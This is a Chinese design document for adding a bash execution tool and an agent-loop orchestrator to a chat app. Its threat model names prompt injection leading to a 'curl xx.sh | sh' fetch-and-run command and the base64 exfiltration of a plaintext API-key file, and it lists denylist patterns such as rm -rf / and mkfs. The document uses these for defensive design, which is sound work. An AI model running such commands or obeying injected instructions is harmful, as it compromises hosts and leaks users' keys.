# AI 工具插件 + Loop 插件分析（agent-loop-analysis）

> 目标：为 polaris-lite 增加「AI 对话工具插件」与「AI 对话 loop 插件」两个插件。第一个工具 = **bash 工具**——有了 bash，AI 可以自举衍生一切能力（写脚本、跑命令、装东西、读文件）。本文只做分析设计，未实施。
> 分析日期：2026-11-18。关键上游能力已实测（见 §0）。

---

## 0. 关键实证（决定方案可行性的三件事）

| 实证 | 结论 | 证据 |
|---|---|---|
| **MOSI nex-n2.6 支持 OpenAI function calling** | ✅ 非流式探测 200：返回 `tool_calls:[{id, type:'function', function:{name:'get_time', arguments:'{}'}}]` + `finish_reason:'tool_calls'`，且带 `reasoning_content` | 2026-11-18 经 /api/model-relay 实测（providerId=prov-mwm7tq53） |
| **中继已是 providerId 制** | 服务端 provider store（`.polaris-lite/providers.json`）持有明文 key；relay 接受 `{providerId, body}`，引擎不接触 key | server/relay-core.mjs:37、server/provider-store.mjs |
| **real-engine 当前不透传 tools** | 请求体只拼 `{model, stream, messages, ...capabilityParams}`；流式解析只认 `delta.content`，丢弃 `delta.tool_calls`；`finish_reason` 未读取 | plugins/real-engine/index.ts:120-175 |
| **插件纯前端** | 插件 bundle 在浏览器运行，**无法直接 spawn 进程**——bash 执行必须走服务端通道（与 relay 同模式的 host 内嵌路由） | 插件全部经动态 import() 在浏览器加载 |
| **信任模型已是两层** | manifest 申请 ∩ grants.json 授权 = 实际权限；grants 进版本控制可评审 | src/core/policy.ts、public/grants.json |

---

## 1. 总体架构：谁做什么

```
┌────────────┐  cap.ai.chat(带tools)   ┌─────────────┐  /api/model-relay   ┌────────┐
│ chat-lite  │ ──────────────────────▶ │ real-engine │ ──────────────────▶ │ MOSI   │
│ (UI+store) │ ◀─ chat-event 广播 ───── │ (纯管道)     │ ◀── tool_calls ─── │ 上游   │
└─────┬──────┘                         └─────────────┘                     └────────┘
      │ 用户消息改发 cap.agent.loop                                          ▲
      ▼                                                                     │
┌──────────────────┐  ①dispatch cap.ai.chat   ┌──────────────┐   ③/api/tool/exec  │
│ agent-loop 插件   │ ───────────────────────▶ │ (同上复用)     │ ────────────────▶ │
│ (编排：模型↔工具)  │ ◀─ chat-event 过滤本loop  │              │   (服务端执行bash)  │
│                  │  ②tool.call 事件          └──────────────┘                    │
│        ┌─────────┴─────────┐                                                   │
│        ▼                   ▼                                                   │
│  cap.tool.bash          cap.tool.registry ── 描述各工具(JSON Schema) ──────────▶│
│  (bash工具插件)          (工具注册表，loop聚合出 tools 数组)                      │
└──────────────────┘                                                             │
      │ 工具结果 tool.result 事件 + 审批卡片事件                                    │
      ▼                                                                          │
   chat-lite 渲染（命令/输出/退出码卡片 + 允许一次/总是允许/拒绝 按钮）◀──────────── ┘
```

**分工铁律（延续现有解耦）**：
- **real-engine 保持纯管道**：加 `tools` 透传 + 流式 `tool_calls` 解析，但不理解工具语义、不执行工具、不做循环；
- **agent-loop 插件**：唯一编排者——聚合工具描述 → 带进 cap.ai.chat → 收 tool_calls → 调 cap.tool.* 执行 → 把结果作为 `role:'tool'` 消息喂回 → 循环直到 `finish_reason=stop` 或上限；
- **工具插件（bash 是第一个）**：只做两件事——向 loop 提供**工具描述**（名称/说明/JSON Schema），把 loop 传来的参数经**服务端执行通道**跑掉并回传结果；不理解对话上下文；
- **chat-lite**：消息流新增「工具卡片」渲染（命令、输出、退出码、审批按钮），事件来源校验沿用（source!=='engine' 忽略）。

---

## 2. 契约设计（新增，改动面最小化）

### 2.1 StreamEvent 扩展（real-engine → 消费者）
`src/core/types.ts` 的 `StreamEvent.kind` 是开放 string，无需改类型定义，只需新增约定：

```
tool.calls   payload: { sessionId, messageId, toolCalls: [{id, name, arguments}] }   // finish_reason=tool_calls 时发
tool.delta   payload: { sessionId, messageId, index, idChunk?, nameChunk?, argsChunk? }  // 流式增量（可选，第一期可聚合后只发 tool.calls）
message.done payload 增加 { finishReason }   // 'stop' | 'tool_calls' | 'length'
```

### 2.2 工具插件契约（新增到 plugins/sdk）
```ts
/** 工具插件向 loop 提供的描述（喂给模型 tools 数组的原料） */
interface ToolDescriptor {
  cap: string;                    // 执行通道，如 'cap.tool.bash'
  name: string;                   // 模型可见名，如 'bash'
  description: string;            // 给模型的用途说明
  parameters: JSONSchema;         // 参数 schema
  /** 安全等级：loop 据此决定审批策略 */
  danger: 'read' | 'write' | 'execute';
}
```
- 工具插件在 setup 时 `api.emit('tool-registered', descriptor)`；agent-loop 监听收集（含启动时向 cap.tool.registry/list 主动拉取一次，防加载顺序竞态）；
- 工具执行走普通非流式 cap：`api.dispatch({target:'cap.tool.bash', action:'exec', payload:{command, cwd?, timeoutMs?}})` → `{ok, stdout, stderr, exitCode, durationMs, truncated}`。

### 2.3 服务端执行通道（host 内嵌，与 relay 同模式）
- 新路由 `POST /api/tool/exec`，插进 `server/host.mjs` 中间件链（鉴权之后）；
- **会话 cookie 硬门禁**（复用 auth.getSession）——外部 curl 无 cookie 一律 401；
- 执行：`child_process.spawn`（shell 跨平台：win32 用 `cmd /c`，类 Unix 用 `/bin/sh -c`）；
- 护栏参数化：`cwd`（默认锁定工作区目录，禁止越界）、`timeoutMs`（默认 30s 上限 300s）、输出截断（stdout+stderr 上限 ~64KB，超限标记 truncated）、进程树清理（taskkill /T win32、负进程组 kill 类 Unix）；
- **审批模式由服务端强制**：请求携带 `mode`，服务端按配置裁决，不信任前端。

### 2.4 消息与会话契约扩展（chat-lite store）
`ChatMessage.role` 需扩展：`'user' | 'assistant' | 'system' | 'tool'`，并加可选字段：
```ts
toolCall?: { id, name, arguments, result?: string, exitCode?: number, durationMs?: number, denied?: boolean }
```
- loop 通过事件驱动 chat-lite 插入 tool 消息（或 loop 自己持有一份影子 transcript——推荐后者，见 §4.3 权衡）。

---

## 3. bash 工具插件：安全设计（这是「有了 bash 就有了一切」的另一面——有了一切风险）

### 3.1 威胁面清单
| 威胁 | 场景 | 对策 |
|---|---|---|
| 提示注入 → 恶意命令 | AI 读到网页/文件内容被注入「执行 curl xx.sh \| sh」 | 审批模式（§3.2）+ 危险命令模式拦截 + 输出量限制 |
| 数据外传 | 命令把 .polaris-lite/providers.json（明文 key）base64 发出去 | 工作区 cwd 锁定 + 敏感目录读取审计 + 审批默认非全自动 |
| 资源耗尽 | fork 炸弹 / 死循环 / 下载大文件 | timeout 硬杀 + 输出截断 + 并发上限（1 个在途执行） |
| 服务自身被打 | 9825 公网穿透场景下攻击者调 /api/tool/exec | 会话 cookie 硬门禁 + grants 授权 + 审批 |
| Windows/Unix 方言 | 平台差异命令 | 工具描述里声明宿主平台；不模拟跨平台 |

### 3.2 审批模式（对齐 Polaris cap.bash 的形态，但简化）
| 模式 | 行为 | 默认 |
|---|---|---|
| `confirm` | 每条命令先在聊天里出审批卡片（命令全文 + 危险标记），用户点「允许一次 / 本次会话总是允许该前缀 / 拒绝」 | **默认** |
| `allowlist` | 前缀白名单（如 `node`, `python`, `git status`, `ls`）自动放行，其余进 confirm | 可选 |
| `yolo` | 全自动执行（仅本机工具形态 + 用户显式在面板切换；危险模式拦截仍生效） | 需显式开启 |
- 模式存 config-manager（`namespace='agent-bash'`），**服务端可读**（服务端是裁决者，不能只靠前端开关）；
- 危险模式硬拦截（denylist 正则）：`rm -rf /`、`format`、`mkfs`、`shutdown`、`curl|sh` 管道、写 `.polaris-lite/`、改 providers.json、reg add、schtasks 等——命中后**直接拒绝且不可用 yolo 豁免**（yolo 豁免的是「确认疲劳」，不是危险本身）；
- 全部执行入审计：命令、退出码、耗时、模式、审批人（owner）→ 审计尾部面板可见。

### 3.3 自举衍生能力的边界（用户点名的价值）
- AI 可用 bash 写 node/python 脚本并执行 → 等效获得「任意工具」：HTTP 抓取、文件读写、文本处理……
- 但**进程内 cap 不会因 bash 而扩张**：AI 衍生的是「脚本级能力」（一次性，经 /api/tool/exec），不是「插件级能力」（常驻，需 cap 注册）。这是有意的边界——插件安装仍走 registry/grants 人工链，防止 AI 自我提权；
- 后续可加「工具缓存」：AI 写过的高频脚本存进工作区 `scripts/`，工具描述追加说明让模型复用，降低重复生成成本。

---

## 4. agent-loop 插件设计

### 4.1 循环状态机
```
IDLE → RUNNING ──(dispatch cap.ai.chat 带 tools)──▶ STREAMING
  ▲                                                   │
  │                                    finish_reason= │
  │              ┌────────────── tool_calls ◀─────────┤ stop → DONE(终文本已流出)
  │              ▼                                     │ length → DONE(截断提示)
  │        EXECUTE_TOOLS                               │ error/interrupt → IDLE(带原因)
  │   逐个: 审批(需时挂起 WAIT_APPROVAL) → cap.tool.*   │
  │        → 收集 tool 消息(role:'tool')                │
  └──────────┘  追加进 transcript 后回 RUNNING          │
  上限: maxTurns(默认 8) / maxToolCalls(默认 16) / 用户中断任意时刻生效
```
- **中断传播**：chat-lite 的停止 → cap.agent.loop/interrupt → loop 内部先 `cap.ai.chat.interrupt` 杀模型流，再杀在途 bash（进程树）→ 清 running 表；幂等语义与现有 interruptHandler 一致（found 回执 + 自愈复位）；
- **并发边界**：每会话同时只允许一个 loop 在跑（running map 按 sessionId），第二条消息入队复用 chat-lite 的 pending 队列语义。

### 4.2 与 chat-lite 的对接（改动最小的路径）
- chat-lite 的 `sendUserMessage` 增加**能力探测**：`cap.meta/list` 或 try-dispatch 发现 `cap.agent.loop` 存在且启用 → 发 `{target:'cap.agent.loop', action:'start', payload:{sessionId, messageId, prompt, history}}`；不存在则回落 `cap.ai.chat`（纯对话模式不坏）；
- loop 复用同一 `chat-event` 广播通道向外发事件（`source:'agent'`），事件种类：`message.delta/done`（透传模型文本）、`tool.calls`、`tool.result`、`tool.approval.required`、`tool.approval.resolved`、`loop.done`、`stream.error`；
- chat-lite 事件过滤器现按 `source==='engine'` 校验——需放宽为白名单 `{engine, agent}`（一行改动 + 类型注释）。

### 4.3 transcript 归属（关键权衡）
| 方案 | 说明 | 取舍 |
|---|---|---|
| **A. loop 持影子 transcript（推荐）** | loop 内部维护完整 OpenAI messages 数组（含 tool 消息），跨轮自持；chat-lite 会话里只落「可见消息」：用户文本、assistant 文本、工具卡片（rendered from tool.* 事件） | 模型协议数组与 UI 消息解耦；chat-lite store 契约**零改动**；loop 刷新丢失 = 会话刷新后 loop 历史不在——可后续落 config-manager 持久化 |
| B. 扩展 ChatMessage 契约 | role 加 'tool'，store 直接存协议消息 | store 改动大，chat-lite 渲染分支多；且「日志即真相」原则下 store 变成协议存储，越权 |

第一期取 A；持久化（刷新恢复 loop 上下文）作为第二期。

### 4.4 审批流（confirm 模式的交互闭环）
```
loop ─ tool.approval.required{callId, command, danger} ─▶ chat-lite 卡片（允许一次/总是该前缀/拒绝）
用户点击 ─▶ chat-lite dispatch cap.agent.loop/resolveApproval {callId, decision}
loop 校验 callId 属于本会话在途调用（防伪造）→ 放行执行 / 记 denied 结果喂回模型
「总是该前缀」→ loop 写入会话级 allowlist（config-manager 持久化，服务端同读）
```
超时（默认 120s 无人响应）= 视为拒绝，喂回模型「用户未响应，工具被拒」，循环继续或终止。

---

## 5. 实施分期（建议 4 期，每期可独立验收）

| 期 | 内容 | 验收 |
|---|---|---|
| **P1 引擎工具透传** | real-engine：请求体透传 `tools/tool_choice`；流式聚合 `delta.tool_calls`（按 index 拼接 id/name/arguments 分片）；发 `tool.calls`/`finishReason` 事件。**UI 不接** | 探针脚本：带 tools 的请求返回 tool_calls 事件（非流式已证可行） |
| **P2 服务端执行通道** | /api/tool/exec 路由 + spawn/timeout/截断/进程树杀 + cookie 门禁 + denylist + 审计 + config-manager 模式开关 | curl 无 cookie 401；带 cookie 跑 `echo hello`；timeout 硬杀；denylist 命中拒绝 |
| **P3 bash 工具插件 + loop 插件** | tool-registered 契约；agent-loop 状态机 + 中断传播 + chat-lite 对接（工具卡片渲染、source 白名单、审批按钮） | 「列出当前目录文件」→ AI 调 bash → 卡片显示命令与输出 → 最终回答引用结果 |
| **P4 打磨** | allowlist 持久化、loop transcript 落盘、maxTurns 配置面板、错误恢复（工具失败喂回模型自纠） | 刷新后会话工具卡片仍在；AI 对失败命令自动修正重试 |

**风险与开放问题**：
1. nex-n2.6 **流式**下 tool_calls 增量分片格式需实测（P1 第一件事就是流式探针；若流式异常可先走非流式 tools 请求——MOSI 非流式已验证可用）；
2. 公网穿透（120.79.164.155:9825）下 bash 执行的风险显著放大——公网部署默认应强制 confirm 且 denylist 生效，甚至服务端直接禁用 exec（配置开关 `PLITE_TOOL_EXEC=0`）；
3. tool 结果可能很大（如 cat 大文件）——截断 + 摘要喂回（保留头尾 8KB），防止上下文爆炸；
4. Windows 杀进程树：`taskkill /PID x /T /F`；Node 24 `child.kill('SIGTERM')` 在 Windows 只杀直接子进程，**必须用 taskkill**（Polaris docker-desk 已踩过此坑）。

## 6. 改动面清单（实施时对照）
- `plugins/real-engine/`：+tools 透传、+tool_calls 流式聚合、+事件（~60 行）
- `server/tool-exec.mjs`（新）+ `server/host.mjs` 挂链（~180 行）
- `plugins/agent-bash/`（新工具插件，~200 行）
- `plugins/agent-loop/`（新 loop 插件，~400 行）
- `plugins/chat-lite/`：事件 source 白名单 + 工具卡片渲染 + 审批卡片（~150 行）
- `plugins/sdk/index.ts`：+ToolDescriptor / 事件 kind 常量（~40 行）
- `public/grants.json`：+3 个插件登记（人工评审环节）
- `src/core/types.ts`：ChatMessage.role 若走方案 B 才需要改（方案 A 不改）
